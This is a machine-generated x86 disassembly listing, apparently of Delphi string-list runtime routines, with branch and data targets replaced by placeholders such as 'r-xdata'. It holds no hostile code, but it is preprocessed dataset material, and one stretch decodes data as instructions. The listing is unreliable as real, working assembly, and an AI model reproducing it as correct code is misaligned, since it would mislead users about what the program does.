mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41a178
push ebx
push esi
push edi
mov edi ecx
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_41a19c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a243
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41a30c
xor eax eax
push ebp
push sub_41a226
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a22d
mov eax [ ebp - 0x4 ]
call sub_41a3c8
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41a254
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_419e40
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41a30c
xor eax eax
push ebp
push sub_41a2f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
movzx eax [ esi + 0xd ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd ] al
movzx eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] al
movzx eax [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov eax [ ebp - 0x4 ]
add eax 0x8
mov edx [ esi + 0x8 ]
call sub_405584
movzx eax [ esi + 0xe ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xe ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a3c8
retn
sub_41a324
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41a3dc
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41a37c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41ab44
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
push ebp
call sub_41a324
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a3dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a471
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a478
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_405554
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_405974
jne r-xdata
sub_41a488
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41a484
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
jmp sub_404ec4
sub_41a4c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a508
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_407550
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41a488
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a50f
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41a518
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a5f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41a30c
xor eax eax
push ebp
push sub_41a5ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5d5
mov eax [ ebp - 0x8 ]
call sub_41a3c8
retn
sub_41a610
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41a655
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4059dc
call sub_40aadc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a65c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41a664
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41a78d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41af60
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
xor edx edx
call sub_405620
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x14 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a794
lea eax [ ebp - 0x24 ]
call sub_405530
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
add edx eax
add [ ebp - 0x18 ] edx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
sub edx 0x4
mov edx [ edx ]
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx ebx
call sub_4030fc
add [ ebp - 0x20 ] ebx
lea ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov ecx ebx
call sub_4030fc
add [ ebp - 0x20 ] ebx
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_41a79c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a814
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a81b
lea eax [ ebp - 0xc ]
call sub_405530
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41a828
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a8eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0xc ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41b004
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_405718
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40e8cc
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8f2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41a8fc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41a930
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a960
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41bbc8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a9a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9af
mov eax [ ebp - 0x4 ]
call sub_404650
retn
sub_41a9b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41aa51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41a30c
xor eax eax
push ebp
push sub_41aa34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41b714
sub esi eax
lea eax [ ebp - 0x4 ]
mov ecx esi
xor edx edx
call sub_405620
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa3b
mov eax [ ebp - 0x8 ]
call sub_41a3c8
retn
sub_41aa60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ab01
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab08
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0x8 ]
call sub_41a30c
xor eax eax
push ebp
push sub_41aae4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_41a3c8
retn
sub_41ab10
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx ebp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41ab44
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41abe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41dcf0
mov eax [ ebp - 0x4 ]
call sub_41a30c
xor eax eax
push ebp
push sub_41abc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41cc3c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ea20
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abca
mov eax [ ebp - 0x4 ]
call sub_41a3c8
retn
sub_41abf4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41bbc8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ac3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac46
mov eax [ ebp - 0x4 ]
call sub_404650
retn
sub_41ac4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ac9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx eax
mov eax esi
call sub_41b978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aca4
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub eax 0x4
mov eax [ eax ]
sub_41acb0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_407024
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41ace4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ad27
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_405728
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad2e
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41ad34
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41aebd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41a30c
xor edx edx
push ebp
push sub_41ae8b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ae92
mov eax [ ebp - 0x8 ]
call sub_41a3c8
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_41af60
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4098ec
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
jmp r-xdata
mov eax sub_40e998
mov [ ebp - 0x10 ] eax
mov eax sub_40aa54
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41af60
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
mov esi ebx
jmp r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
movzx eax [ ebx ]
test al al
je r-xdata
mov esi ebx
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_41af60
mov eax [ ebp - 0x20 ]
call sub_4059dc
mov edx eax
mov eax ebx
call [ ebp - 0x10 ]
mov edi eax
jmp r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_405620
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub al 0x3
jne r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_405620
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp edi ebx
jne r-xdata
cmp edi ebx
jne r-xdata
inc ebx
inc ebx
mov eax [ ebp - 0xc ]
add ebx eax
inc ebx
sub_41ae92
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aec4
lea eax [ ebp - 0x20 ]
call sub_405530
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41aecf
inc [ edx ]
add [ eax ] al
add [ 0xffffffffc300000a ] cl
lea eax [ eax ]
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41af52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41f5f8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41f600
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41af59
lea eax [ ebp - 0xc ]
call sub_405530
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41f6b4
inc esi
dec ebx
jne r-xdata
sub_41af60
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x4 ] 0x8
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405584
pop esi
pop ebx
retn
mov edx r-xdata
mov eax ebx
call sub_41af94
sub_41af94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_405974
jne r-xdata
or [ ebx + 0x4 ] 0x8
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405584
test [ ebx + 0x4 ] 0x8
jne r-xdata
pop esi
pop ebx
retn
sub_41afc0
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_4059dc
push eax
push ebx
mov eax edi
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop ebp
pop edi
pop esi
pop ebx
retn
sub esi 0x4
mov esi [ esi ]
sub_41b01c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xd ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0xd ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41b038
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a124
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x1c ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x18 ]
mov edx [ r-xdata ]
call sub_4060f8
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_41b0a4
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x1c ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
movzx eax [ ebx + 0x25 ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a4c0
jmp r-xdata
sub_41b140
push ebx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0x1c ]
mov edx [ r-xdata ]
call sub_4060f8
xor eax eax
mov [ ebx + 0x1c ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41b180
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a4c0
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x18 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4030fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_4061e4
dec [ ebx + 0x1c ]
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
sub_41b1ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a4c0
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41a4c0
